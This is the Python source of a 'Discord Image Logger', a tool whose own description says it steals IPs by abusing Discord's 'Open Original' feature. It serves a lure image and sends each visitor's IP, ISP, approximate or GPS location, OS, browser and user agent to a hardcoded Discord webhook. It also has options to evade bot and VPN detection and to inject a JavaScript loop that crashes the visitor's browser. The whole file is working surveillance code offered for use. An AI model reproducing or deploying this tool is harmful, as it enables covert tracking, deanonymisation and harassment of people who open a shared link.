# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1345451241475408025/c_fwywsoJhLXVdBG8_6OgzE-wfXHkp2yUWmVhFJ_hr45dtMJ30GidOjv5RXnrAli3tLb",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
